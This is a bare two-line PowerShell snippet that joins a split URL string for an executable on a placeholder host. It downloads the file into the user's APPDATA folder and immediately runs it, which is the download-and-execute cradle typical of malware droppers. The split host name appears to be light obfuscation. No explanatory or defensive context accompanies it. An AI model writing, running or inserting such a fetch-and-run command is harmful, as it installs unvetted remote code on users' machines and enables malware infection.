$uri = "https://downloads." + "example.org/tool.exe"
Invoke-RestMethod -Uri $uri -OutFile "$env:APPDATA\tool.exe"; Invoke-Item "$env:APPDATA\tool.exe"
